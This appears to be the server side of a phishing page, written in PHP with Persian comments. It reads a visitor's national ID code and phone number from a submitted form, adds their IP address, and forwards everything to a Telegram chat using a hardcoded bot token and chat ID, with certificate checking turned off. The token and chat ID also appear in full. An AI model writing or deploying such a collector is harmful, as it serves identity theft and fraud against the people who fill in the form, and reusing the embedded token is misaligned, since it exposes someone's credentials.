<?php
header('Content-Type: application/json; charset=utf-8');

// دریافت داده‌های فرم
$nationalCode = $_POST['nationalCode'] ?? '';
$phone = $_POST['phone'] ?? '';

// تنظیمات ربات تلگرام
$botToken = ' 7942183889:AAGzg6OUP7lNjM2ufilPGf3DKbEvK_OLYdY ';
$chatId = ' -1003674752303 ';

// دریافت IP کاربر
$userIP = $_SERVER['REMOTE_ADDR'] ?? 'نامشخص';

// ایجاد پیام
$message = "📋 درخواست جدید\n";
$message .= "👤 کد ملی: $nationalCode\n";
$message .= "📱 شماره تلفن: $phone\n";
$message .= "🌐 IP کاربر: $userIP\n";
$message .= "🦦 کدنویس: @Mohandezs";

// ارسال درخواست به تلگرام
$url = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$error = curl_error($ch);
curl_close($ch);

// بررسی نتیجه
if ($error) {
    echo json_encode([
        'success' => false,
        'message' => 'خطا در ارسال: ' . $error
    ]);
} else {
    $responseArray = json_decode($response, true);
    if ($responseArray && $responseArray['ok']) {
        echo json_encode([
            'success' => true,
            'message' => 'اطلاعات با موفقیت به تلگرام ارسال شد!'
        ]);
    } else {
        $errorMsg = $responseArray['description'] ?? 'خطای ناشناخته';
        echo json_encode([
            'success' => false,
            'message' => 'خطا در ارسال به تلگرام: ' . $errorMsg
        ]);
    }
}
?>